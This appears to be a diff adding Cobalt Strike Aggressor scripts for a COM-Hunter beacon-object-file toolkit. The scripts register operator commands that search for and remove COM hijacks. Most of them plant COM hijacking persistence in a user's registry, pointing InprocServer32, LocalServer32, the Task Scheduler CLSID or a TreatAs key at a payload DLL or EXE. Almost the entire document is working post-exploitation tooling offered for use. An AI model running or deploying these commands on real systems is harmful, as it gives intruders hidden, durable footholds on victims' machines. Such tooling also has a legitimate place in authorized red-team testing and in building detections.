@@ -1,0 +1,520 @@
+# com_hunter_search.cna
+
+beacon_command_register(
+    "com_hunter_search",
+    "Search for COM objects in registry by CLSID",
+    "Usage: com_hunter_search <CLSID> <server_mode> [hive_mode]\n\n" .
+    "Arguments:\n" .
+    "  CLSID        The COM class identifier (e.g., {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5})\n" .
+    "  server_mode  Server type to search (integer 0-2)\n" .
+    "  hive_mode    Registry hive to search (integer 0-2) - optional, defaults to 0\n\n" .
+    "Server Modes:\n" .
+    "  0 = All (InprocServer32 & LocalServer32)\n" .
+    "  1 = InprocServer32 only\n" .
+    "  2 = LocalServer32 only\n\n" .
+    "Hive Modes:\n" .
+    "  0 = All (HKLM & HKCU) - default\n" .
+    "  1 = Machine only (HKLM)\n" .
+    "  2 = User only (HKCU)\n\n" .
+    "Examples:\n" .
+    "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 0      Search all in both hives\n" .
+    "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 1 2    InprocServer32 in HKCU only\n" .
+    "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1    LocalServer32 in HKLM only"
+);
+
+sub showHelp_search {
+    local('$bid');
+    $bid = $1;
+    
+    berror($bid, "Usage: com_hunter_search <CLSID> <server_mode> [hive_mode]\n");
+    berror($bid, "Arguments:");
+    berror($bid, "  CLSID        The COM class identifier (with or without braces)");
+    berror($bid, "  server_mode  Server type to search (integer 0-2)");
+    berror($bid, "  hive_mode    Registry hive to search (integer 0-2) - optional\n");
+    berror($bid, "Server Modes:");
+    berror($bid, "  0 = All (InprocServer32 & LocalServer32)");
+    berror($bid, "  1 = InprocServer32 only");
+    berror($bid, "  2 = LocalServer32 only\n");
+    berror($bid, "Hive Modes:");
+    berror($bid, "  0 = All (HKLM & HKCU) - default");
+    berror($bid, "  1 = Machine only (HKLM)");
+    berror($bid, "  2 = User only (HKCU)\n");
+    berror($bid, "Examples:");
+    berror($bid, "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 0");
+    berror($bid, "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 1 2");
+    berror($bid, "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1");
+}
+
+# Normalize CLSID - add braces if missing
+sub normalizeCLSID {
+    local('$clsid');
+    $clsid = $1;
+    
+    if (left($clsid, 1) eq "{" && right($clsid, 1) eq "}") {
+        return $clsid;
+    }
+    
+    return "{" . $clsid . "}";
+}
+
+alias com_hunter_search {
+    local('$barch $handle $data $args $serverMode $hiveMode $clsid');
+    
+    # No arguments or help requested
+    if (size(@_) < 2) {
+        showHelp_search($1);
+        return;
+    }
+    
+    # Need at least CLSID and server_mode
+    if (size(@_) < 3) {
+        showHelp_search($1);
+        return;
+    }
+    
+    $clsid = $2;
+    $serverMode = $3;
+    
+    # Hive mode is optional, defaults to 0 (all)
+    if (size(@_) >= 4) {
+        $hiveMode = $4;
+    } else {
+        $hiveMode = 0;
+    }
+    
+    # Normalize CLSID (add braces if missing)
+    $clsid = normalizeCLSID($clsid);
+    
+    # Validate server mode is 0-2
+    if ($serverMode is $null || $serverMode < 0 || $serverMode > 2) {
+        berror($1, "Invalid server mode: $serverMode (must be 0, 1, or 2)");
+        showHelp_search($1);
+        return;
+    }
+    
+    # Validate hive mode is 0-2
+    if ($hiveMode is $null || $hiveMode < 0 || $hiveMode > 2) {
+        berror($1, "Invalid hive mode: $hiveMode (must be 0, 1, or 2)");
+        showHelp_search($1);
+        return;
+    }
+    
+    $barch = barch($1);
+    $handle = openf(script_resource("com_hunter_search/com_hunter_search. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($1, "Could not load BOF file: com_hunter_search/com_hunter_search. $+ $barch $+ .o");
+        return;
+    }
+    
+    # Pack: z = null-terminated string, i = 4-byte int, i = 4-byte int
+    $args = bof_pack($1, "zii", $clsid, $serverMode, $hiveMode);
+    
+    btask($1, "COM-Hunter BOF by @nickvourd");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# com_hunter_persist.cna
+
+beacon_command_register(
+    "com_hunter_persist",
+    "Establish COM hijacking persistence in HKCU",
+    "Usage: com_hunter_persist <CLSID> <payload_path> <mode>\n\n" .
+    "Arguments:\n" .
+    "  CLSID         The COM class identifier (e.g., {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5})\n" .
+    "  payload_path  Path to the payload DLL or EXE\n" .
+    "  mode          Persist mode (integer 0-1)\n\n" .
+    "Modes:\n" .
+    "  0 = InprocServer32 (for DLL payloads)\n" .
+    "  1 = LocalServer32 (for EXE payloads)\n\n" .
+    "Examples:\n" .
+    "  com_hunter_persist {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5} C:\\Windows\\Temp\\payload.dll 0\n" .
+    "  com_hunter_persist AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 C:\\Windows\\Temp\\payload.exe 1"
+);
+
+sub showHelp_persist {
+    local('$bid');
+    $bid = $1;
+    
+    berror($bid, "Usage: com_hunter_persist <CLSID> <payload_path> <mode>\n");
+    berror($bid, "Arguments:");
+    berror($bid, "  CLSID         The COM class identifier (with or without braces)");
+    berror($bid, "  payload_path  Path to the payload DLL or EXE");
+    berror($bid, "  mode          Persist mode (integer 0-1)\n");
+    berror($bid, "Modes:");
+    berror($bid, "  0 = InprocServer32 (for DLL payloads)");
+    berror($bid, "  1 = LocalServer32 (for EXE payloads)\n");
+    berror($bid, "Examples:");
+    berror($bid, "  com_hunter_persist {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5} C:\\Windows\\Temp\\payload.dll 0");
+    berror($bid, "  com_hunter_persist AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 C:\\Windows\\Temp\\payload.exe 1");
+}
+
+# Normalize CLSID - add braces if missing
+sub normalizeCLSID {
+    local('$clsid');
+    $clsid = $1;
+    
+    # Check if already has braces
+    if (left($clsid, 1) eq "{" && right($clsid, 1) eq "}") {
+        return $clsid;
+    }
+    
+    # Add braces
+    return "{" . $clsid . "}";
+}
+
+alias com_hunter_persist {
+    local('$barch $handle $data $args $mode $clsid $payload');
+    
+    # No arguments or help requested
+    if (size(@_) < 2) {
+        showHelp_persist($1);
+        return;
+    }
+    
+    # Need CLSID, payload, and mode
+    if (size(@_) < 4) {
+        showHelp_persist($1);
+        return;
+    }
+    
+    $clsid = $2;
+    $payload = $3;
+    $mode = $4;
+    
+    # Normalize CLSID (add braces if missing)
+    $clsid = normalizeCLSID($clsid);
+    
+    # Validate mode is a number 0-1
+    if ($mode is $null || $mode < 0 || $mode > 1) {
+        berror($1, "Invalid mode: $mode (must be 0 or 1)");
+        showHelp_persist($1);
+        return;
+    }
+    
+    $barch = barch($1);
+    $handle = openf(script_resource("com_hunter_persist/com_hunter_persist. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($1, "Could not load BOF file: com_hunter_persist/com_hunter_persist. $+ $barch $+ .o");
+        return;
+    }
+    
+    # Pack: z = null-terminated string, z = null-terminated string, i = 4-byte int
+    $args = bof_pack($1, "zzi", $clsid, $payload, $mode);
+    
+    btask($1, "COM-Hunter BOF by @nickvourd");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# com_hunter_tasksch.cna
+
+beacon_command_register(
+    "com_hunter_tasksch",
+    "Establish Task Scheduler COM hijacking persistence in HKCU",
+    "Usage: com_hunter_tasksch <payload_path> <mode>\n\n" .
+    "Description:\n" .
+    "  Hijacks the Task Scheduler COM object (CLSID: {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1})\n" .
+    "  in HKCU for persistence.\n\n" .
+    "Arguments:\n" .
+    "  payload_path  Path to the payload DLL or EXE\n" .
+    "  mode          Persist mode (integer 0-1)\n\n" .
+    "Modes:\n" .
+    "  0 = InprocServer32 (for DLL payloads)\n" .
+    "  1 = LocalServer32 (for EXE payloads)\n\n" .
+    "Examples:\n" .
+    "  com_hunter_tasksch C:\\Windows\\Temp\\payload.dll 0\n" .
+    "  com_hunter_tasksch C:\\Windows\\Temp\\payload.exe 1"
+);
+
+sub showHelp_tasksch {
+    local('$bid');
+    $bid = $1;
+    
+    berror($bid, "Usage: com_hunter_tasksch <payload_path> <mode>\n");
+    berror($bid, "Description:");
+    berror($bid, "  Hijacks the Task Scheduler COM object");
+    berror($bid, "  CLSID: {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}\n");
+    berror($bid, "Arguments:");
+    berror($bid, "  payload_path  Path to the payload DLL or EXE");
+    berror($bid, "  mode          Persist mode (integer 0-1)\n");
+    berror($bid, "Modes:");
+    berror($bid, "  0 = InprocServer32 (for DLL payloads)");
+    berror($bid, "  1 = LocalServer32 (for EXE payloads)\n");
+    berror($bid, "Examples:");
+    berror($bid, "  com_hunter_tasksch C:\\Windows\\Temp\\payload.dll 0");
+    berror($bid, "  com_hunter_tasksch C:\\Windows\\Temp\\payload.exe 1");
+}
+
+alias com_hunter_tasksch {
+    local('$barch $handle $data $args $mode $payload');
+    
+    # No arguments or help requested
+    if (size(@_) < 2) {
+        showHelp_tasksch($1);
+        return;
+    }
+    
+    # Need payload and mode
+    if (size(@_) < 3) {
+        showHelp_tasksch($1);
+        return;
+    }
+    
+    $payload = $2;
+    $mode = $3;
+    
+    # Validate mode is a number 0-1
+    if ($mode is $null || $mode < 0 || $mode > 1) {
+        berror($1, "Invalid mode: $mode (must be 0 or 1)");
+        showHelp_tasksch($1);
+        return;
+    }
+    
+    $barch = barch($1);
+    $handle = openf(script_resource("com_hunter_tasksch/com_hunter_tasksch. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($1, "Could not load BOF file: com_hunter_tasksch/com_hunter_tasksch. $+ $barch $+ .o");
+        return;
+    }
+    
+    # Pack: z = null-terminated string, i = 4-byte int
+    $args = bof_pack($1, "zi", $payload, $mode);
+    
+    btask($1, "COM-Hunter BOF by @nickvourd");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# com_hunter_remove.cna
+
+beacon_command_register(
+    "com_hunter_remove",
+    "Remove COM hijacking persistence from registry by CLSID",
+    "Usage: com_hunter_remove <CLSID> <server_mode> [hive_mode]\n\n" .
+    "Arguments:\n" .
+    "  CLSID        The COM class identifier (e.g., {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5})\n" .
+    "  server_mode  Server type to remove (integer 0-2)\n" .
+    "  hive_mode    Registry hive to remove from (integer 0-2) - optional, defaults to 0\n\n" .
+    "Server Modes:\n" .
+    "  0 = All (InprocServer32 & LocalServer32)\n" .
+    "  1 = InprocServer32 only\n" .
+    "  2 = LocalServer32 only\n\n" .
+    "Hive Modes:\n" .
+    "  0 = All (HKLM & HKCU) - default\n" .
+    "  1 = Machine only (HKLM)\n" .
+    "  2 = User only (HKCU)\n\n" .
+    "Examples:\n" .
+    "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 0      Remove all from both hives\n" .
+    "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 1 2    Remove InprocServer32 from HKCU\n" .
+    "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1    Remove LocalServer32 from HKLM"
+);
+
+sub showHelp_remove {
+    local('$bid');
+    $bid = $1;
+    
+    berror($bid, "Usage: com_hunter_remove <CLSID> <server_mode> [hive_mode]\n");
+    berror($bid, "Arguments:");
+    berror($bid, "  CLSID        The COM class identifier (with or without braces)");
+    berror($bid, "  server_mode  Server type to remove (integer 0-2)");
+    berror($bid, "  hive_mode    Registry hive to remove from (integer 0-2) - optional\n");
+    berror($bid, "Server Modes:");
+    berror($bid, "  0 = All (InprocServer32 & LocalServer32)");
+    berror($bid, "  1 = InprocServer32 only");
+    berror($bid, "  2 = LocalServer32 only\n");
+    berror($bid, "Hive Modes:");
+    berror($bid, "  0 = All (HKLM & HKCU) - default");
+    berror($bid, "  1 = Machine only (HKLM)");
+    berror($bid, "  2 = User only (HKCU)\n");
+    berror($bid, "Examples:");
+    berror($bid, "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 0");
+    berror($bid, "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 1 2");
+    berror($bid, "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1");
+}
+
+# Normalize CLSID - add braces if missing
+sub normalizeCLSID {
+    local('$clsid');
+    $clsid = $1;
+    
+    if (left($clsid, 1) eq "{" && right($clsid, 1) eq "}") {
+        return $clsid;
+    }
+    
+    return "{" . $clsid . "}";
+}
+
+alias com_hunter_remove {
+    local('$barch $handle $data $args $serverMode $hiveMode $clsid');
+    
+    # No arguments or help requested
+    if (size(@_) < 2) {
+        showHelp_remove($1);
+        return;
+    }
+    
+    # Need at least CLSID and server_mode
+    if (size(@_) < 3) {
+        showHelp_remove($1);
+        return;
+    }
+    
+    $clsid = $2;
+    $serverMode = $3;
+    
+    # Hive mode is optional, defaults to 0 (all)
+    if (size(@_) >= 4) {
+        $hiveMode = $4;
+    } else {
+        $hiveMode = 0;
+    }
+    
+    # Normalize CLSID (add braces if missing)
+    $clsid = normalizeCLSID($clsid);
+    
+    # Validate server mode is 0-2
+    if ($serverMode is $null || $serverMode < 0 || $serverMode > 2) {
+        berror($1, "Invalid server mode: $serverMode (must be 0, 1, or 2)");
+        showHelp_remove($1);
+        return;
+    }
+    
+    # Validate hive mode is 0-2
+    if ($hiveMode is $null || $hiveMode < 0 || $hiveMode > 2) {
+        berror($1, "Invalid hive mode: $hiveMode (must be 0, 1, or 2)");
+        showHelp_remove($1);
+        return;
+    }
+    
+    $barch = barch($1);
+    $handle = openf(script_resource("com_hunter_remove/com_hunter_remove. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($1, "Could not load BOF file: com_hunter_remove/com_hunter_remove. $+ $barch $+ .o");
+        return;
+    }
+    
+    # Pack: z = null-terminated string, i = 4-byte int, i = 4-byte int
+    $args = bof_pack($1, "zii", $clsid, $serverMode, $hiveMode);
+    
+    btask($1, "COM-Hunter BOF by @nickvourd");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# com_hunter_treatas.cna
+
+beacon_command_register(
+    "com_hunter_treatas",
+    "Establish TreatAs COM hijacking persistence in HKCU",
+    "Usage: com_hunter_treatas <hijack_clsid> <spoof_clsid> <payload_path> <mode>\n\n" .
+    "Description:\n" .
+    "  Creates a TreatAs COM hijacking persistence. This technique creates a new\n" .
+    "  CLSID with your payload and adds a TreatAs key to the hijacked CLSID\n" .
+    "  pointing to your spoofed CLSID.\n\n" .
+    "Arguments:\n" .
+    "  hijack_clsid  The CLSID to hijack (will have TreatAs key added)\n" .
+    "  spoof_clsid   The new CLSID to create (will contain payload)\n" .
+    "  payload_path  Path to the payload DLL or EXE\n" .
+    "  mode          Server type (integer 0-1)\n\n" .
+    "Modes:\n" .
+    "  0 = InprocServer32 (for DLL payloads)\n" .
+    "  1 = LocalServer32 (for EXE payloads)\n\n" .
+    "Examples:\n" .
+    "  com_hunter_treatas {hijack-clsid} {spoof-clsid} C:\\payload.dll 0\n" .
+    "  com_hunter_treatas {hijack-clsid} {spoof-clsid} C:\\payload.exe 1"
+);
+
+sub showHelp_treatas {
+    local('$bid');
+    $bid = $1;
+    
+    berror($bid, "Usage: com_hunter_treatas <hijack_clsid> <spoof_clsid> <payload_path> <mode>\n");
+    berror($bid, "Description:");
+    berror($bid, "  Creates a TreatAs COM hijacking persistence.\n");
+    berror($bid, "Arguments:");
+    berror($bid, "  hijack_clsid  The CLSID to hijack (will have TreatAs key added)");
+    berror($bid, "  spoof_clsid   The new CLSID to create (will contain payload)");
+    berror($bid, "  payload_path  Path to the payload DLL or EXE");
+    berror($bid, "  mode          Server type (integer 0-1)\n");
+    berror($bid, "Modes:");
+    berror($bid, "  0 = InprocServer32 (for DLL payloads)");
+    berror($bid, "  1 = LocalServer32 (for EXE payloads)\n");
+    berror($bid, "Examples:");
+    berror($bid, "  com_hunter_treatas {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5} {11111111-1111-1111-1111-111111111111} C:\\payload.dll 0");
+    berror($bid, "  com_hunter_treatas AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 11111111-1111-1111-1111-111111111111 C:\\payload.exe 1");
+}
+
+# Normalize CLSID - add braces if missing
+sub normalizeCLSID {
+    local('$clsid');
+    $clsid = $1;
+    
+    if (left($clsid, 1) eq "{" && right($clsid, 1) eq "}") {
+        return $clsid;
+    }
+    
+    return "{" . $clsid . "}";
+}
+
+alias com_hunter_treatas {
+    local('$barch $handle $data $args $mode $hijackClsid $spoofClsid $payload');
+    
+    # No arguments or help requested
+    if (size(@_) < 2) {
+        showHelp_treatas($1);
+        return;
+    }
+    
+    # Check for help flags
+    if ($2 eq "-h" || $2 eq "--help" || $2 eq "help" || $2 eq "?") {
+        showHelp_treatas($1);
+        return;
+    }
+    
+    # Need hijack_clsid, spoof_clsid, payload, and mode
+    if (size(@_) < 5) {
+        showHelp_treatas($1);
+        return;
+    }
+    
+    $hijackClsid = $2;
+    $spoofClsid = $3;
+    $payload = $4;
+    $mode = $5;
+    
+    # Normalize CLSIDs (add braces if missing)
+    $hijackClsid = normalizeCLSID($hijackClsid);
+    $spoofClsid = normalizeCLSID($spoofClsid);
+    
+    # Validate mode is 0-1
+    if ($mode is $null || $mode < 0 || $mode > 1) {
+        berror($1, "Invalid mode: $mode (must be 0 or 1)");
+        showHelp_treatas($1);
+        return;
+    }
+    
+    $barch = barch($1);
+    $handle = openf(script_resource("com_hunter_treatas/com_hunter_treatas. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($1, "Could not load BOF file: com_hunter_treatas/com_hunter_treatas. $+ $barch $+ .o");
+        return;
+    }
+    
+    # Pack: z = string, z = string, z = string, i = int
+    $args = bof_pack($1, "zzzi", $hijackClsid, $spoofClsid, $payload, $mode);
+    
+    btask($1, "COM-Hunter BOF by @nickvourd");
+    beacon_inline_execute($1, $data, "go", $args);
+}
